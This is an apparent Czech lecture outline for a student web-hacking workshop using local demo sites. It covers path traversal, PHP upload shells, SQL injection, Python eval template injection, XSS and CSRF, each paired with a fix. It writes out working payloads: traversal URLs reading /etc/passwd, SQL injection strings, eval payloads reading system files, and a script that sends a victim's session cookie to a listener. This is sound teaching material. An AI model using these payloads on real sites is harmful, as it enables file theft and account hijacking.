# Hackování webů

Osnova a příprava přednášky.

Příprava PHP prostředí:
```sh
sudo apt install php-fpm php-sqlite3
sudo cp etc/php-fpm-jirka.conf /etc/php/8.2/fpm/pool.d/
sudo systemctl restart php8.2-fpm.service

nginx -p $(pwd) -c etc/nginx.conf
```

Cleanup PHP prostředí:
```sh
sudo rm /etc/php/8.2/fpm/pool.d/php-fpm-jirka.conf
sudo systemctl restart php8.2-fpm.service
```

## Jak funguje web?

Budeme dělat celkem tři typy útoků:

1. Útok na web samotný = přesvědčit web, aby udělal něco, co chci)
2. Útok na uživatele = přesvědčit uživatele (nebo jeho prohlížeč :D), aby udělal, co chci
3. Útok mezi = odposlouchávat nebo narušovat komunikaci (MITM = Man-in-the-middle)

Abychom věděli, jak se dá útočit, musíme nejdřív pochopit základ webu:

- Protokol HTTP = HyperText Transfer Protocol
  - request a odpověď (metody requestu - GET/POST/...)
  - obsahuje hlavičky
  - podívejme se na nějaký (`curl -v https://smf.mff.cuni.cz/`)
- Je bezestavový = server každý request obsluhuje samostatně
  - Klient (browser) mu předá informace:
    - cesta (`index.php`) + argumenty cesty (`?akce=zprava`)
    - tělo requestu (tudy jdou POST argumenty)
    - hlavičky
      - takhle typicky funguje přihlášení - **Cookies**

Ukázka GET+POST formů: http://localhost:7000/

## Útoky na server

### 1. Neošetření uživatelského vstupu - cesty (PHP)

Ukázka:

* http://localhost:7001/
* http://localhost:7001/?stranka=kontakty
* http://localhost:7001/?stranka=../../db.conf
* http://localhost:7001/?stranka=../../../../../../../etc/passwd
* bonus: http://localhost:7001/?stranka=../index.php :D

Oprava:

* http://localhost:7001/index2.php
* http://localhost:7001/index2.php?stranka=../../db.conf
* http://localhost:7001/index2.php?stranka=../../../../../../../etc/passwd

### 2. Upload souboru (PHP)

* upload souborů je nebezpečný
  * formulář na upload obrázků do složky images/ (aby šly použít třeba v komentářích)
  * http://localhost:7002/
  * umožňuje ale i upload třeba souboru `02_upload/utok.php`
    * je to PHP soubor s příponou .php -> přistoupíme do http://localhost:7002/images/utok.php
    * ... a můžeme dělat cokoliv, co nám PHP povolí
* obrana:
  * kontrolovat důkladně soubory
  * nebo jim dokonce dávat generická jména
  * http://localhost:7002/index2.php

### 3. SQL injection (PHP)

* občas potřebujeme databázi, ukázka na http://localhost:7003/
  * jednoduchá aplikace - ukládám a získávám klíče

Můžeme zkusit poslat zajímavé payloady:
* https://xkcd.com/327/ :D

```sql
' OR 'a'='a`
" OR "a"="a`
```

Když chceme přidat něco dalšího (třeba LIMIT), lze využít trik s SQL komentářem
(za komentářem musí být mezera):

```sql
' OR 1 = 1 LIMIT 1 OFFSET 1; --
' OR 1 = 1 LIMIT 1 OFFSET 2; --
```

Jak se bránit? Escapovat!
* ideálně jazykové knihovny, ruční escapování je náchylné k tomu napsat správně
  a escapovat všechny speciální znaky
  * jak escapuje SQLite, víme to?
    * https://www.sqlite.org/lang_expr.html
    * zdvojuje `'`
    * lepší použít `SQLite3::escapeString` funkci
  * jak escapuje MySQL?
    * https://www.php.net/manual/en/security.database.sql-injection.php
    * escapuje pomocí `\`
    * lepší použít `mysqli_real_escape_string` funkci

* nebo lze použít předpřipravené SQL statementy a doplnit jako proměnné
* oboje viz index2.php

### 4. Template injection (Python)

* inspirace: TheCatch (CTF hra) https://thecatch.cz/
* potřeba spustit samostatně jako Python projekt:

```sh
cd 04_template_injection
python -m flask --app app run
# opravená verze:
python -m flask --app app2 run
```

Když navštívíme stránku, tak dostaneme hned přesměrování na URL
<http://127.0.0.1:5000/hello/user>, kde se nám zobrazí "Hello user". To svádí k
tomu napsat do URL něco jiného… a skutečně, když změníme poslední část na
cokoliv, tak se to vypíše.

Zkusme, jestli se tím nedá provést nějaký code injection do šablonovacího
systému. První bychom potřebovali zjistit, v jakém jazyce je web napsaný. Zkusme
nejdříve, jestli to není Python, třeba payloadem "+__file__+". Zobrazí se nám
"Hello /app/app.py", je to Python!

Nyní si můžeme zkoušet hrát. Zkusme si vypsat zdrojový kód souboru app.py
payloadem "+str(open(__file__).read())+" (odkaz). V tuto chvíli je dobré si
zobrazit HTML kód stránky, ať vidíme kód aspoň trochu formátovaný:

Vidíme, že je jedná o skutečně jednoduchou aplikaci napsanou v Pythonu pomocí
webového frameworku Flask. Pojďme tedy zkoumat systém:

* Vypsání `/etc/passwd`: `"+str(open('/etc/passwd').read())+"` [odkaz](http://127.0.0.1:5000/hello/%22+str(open(%22/etc/passwd%22).read())+%22)
* Vylistování `/home/smf`: `"+str(__import__("os").listdir("/home/smf"))+"` [odkaz](http://127.0.0.1:5000/hello/%22+str(__import__(%22os%22).listdir(%22/home/smf%22))+%22)
* Přečtení `/home/smf/.bashrc`: `"+str(open("/home/smf/.bashrc").read())+"` [odkaz](http://127.0.0.1:5000/hello/%22+str(open(%22/home/smf/.bashrc%22).read())+%22)

**Jak to opravit?**

* odstranit `eval` :D (v tomhle případě)
* obecně nevěřit vstupu od uživatele - uživatelé se dělí na dva typy - hloupí uživatelé a útočníci

Teaser na další část (na XSS): http://127.0.0.1:5000/hello/%3Cscript%3Ealert(1)%3C/script%3E

## Útoky na uživatele

* umožněné špatnou implementací webu

https://medium.com/@dilarauluturhan/javascript-xss-cross-site-scripting-and-csrf-cross-site-request-forgery-6f0f4baa2fb1

### 5. XSS = Cross-site scripting (příklad: krádež cookie)

* vložíme zlý Javascript do komentáře na stránce http://localhost:7005/
  * stránka, kam lze psát příspěvky
  * může se přihlásit admin a příspěvky mazat
* použijeme druhý prohlížeč simulující útočníka:
  * nejprve vložíme `<script>alert(1)</script>` a otestujeme, že to otravuje všechny
  * admin to pak smaže a přidá třeba varování
  * my přidáme další příspěvek vytahující přes javascript jeho cookie

Útok:

1. Pustíme si `listener.py`
2. Vložíme příspěvek
   ```html
   <script>var i=new Image;i.src="http://127.0.0.1:8888/?"+document.cookie;</script>
   ```
3. Počkáme, než si admin zobrazí tuhle stránku a javascript nám nepošle request
4. Zkopírujeme si obsah PHPSESSID a voilá, jsme admin :D

https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md

### 6. CSRF

* nebudu útočit na web přímo, ale budu útočit přes uživatele
  * jiný uživatel (typicky administrátor) má výrazně větší práva
  * můžu ho donutit udělat něco, co nechce

* Jednoduchý web podobný příkladu v XSS, ale jenom přihlášený může přidávat příspěvky a lajkovat je: http://localhost:7006/

* přinutíme přihlášeného administrátora navštívit náš web:
  * http://localhost:7016/ -> rozcestník
  * http://localhost:7016/utok1.html -> přes obrázek (GET)
  * http://localhost:7016/utok2.html -> přes odeslání formu ve skrytém iframe (POST)

* Obrana: CSRF cookie:
  * cílem je zařídit, aby útočník nevěděl, co má poslat
  * do formu přidáme speciální klíč (CSRF token)
    * hodnota předaná v cookie
    * pokud není nasetována cookie, nasetujeme ji na random hodnotu


## Útoky MITM

* s HTTPS je těžké
* obecně povídání o certifikátech a certifikačních autoritách
  * Lets Encrypt
